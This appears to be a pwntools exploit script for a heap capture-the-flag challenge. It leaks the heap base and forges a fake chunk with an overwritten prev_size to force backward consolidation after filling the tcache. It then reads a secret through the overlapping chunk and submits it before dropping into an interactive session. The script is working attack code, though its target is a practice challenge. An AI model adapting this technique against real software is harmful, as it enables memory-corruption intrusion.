#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

def add(idx, size): 
   io.sendlineafter(b"> ", b'1')
   io.sendlineafter(b": ", str(idx).encode())
   io.sendlineafter(b": ", str(size).encode())

def edit(idx, data): 
   io.sendlineafter(b"> ", b'2')
   io.sendlineafter(b": ", str(idx).encode())
   io.sendafter(b": ", data)

def show(idx):
   io.sendlineafter(b"> ", b'3')
   io.sendlineafter(b": ", str(idx).encode())

def delete(idx):
   io.sendlineafter(b"> ", b'4')
   io.sendlineafter(b": ", str(idx).encode())

io = remote("remote.infoseciitr.in", 8000)

io.recvuntil(b'..0x')
heap_base = int(io.recvline().strip(), 16) - 0x2a0

add (0, 0x68)
edit(0, p64(0) + p64(0x60) + p64(heap_base + 0x2c0)*2)

add (1, 0x58)
add (2, 0xf8)

edit(1, b'A'*0x50 + p64((heap_base + 0x380) - (heap_base + 0x2c0)))
edit(0, p64(0) + p64((heap_base + 0x380) - (heap_base + 0x2c0)) + p64(heap_base + 0x2c0)*2)

for i in range(7): add(3 + i, 0xf8)
for i in range(7): delete(3 + i)

delete(2)
io.sendlineafter(b'> ', b'6') ; show(0)

io.recvuntil(b': ')
secret = io.recv(0x68)[0x10:0x20]

io.sendlineafter(b'> ', b'5')
io.send(secret)

io.interactive()

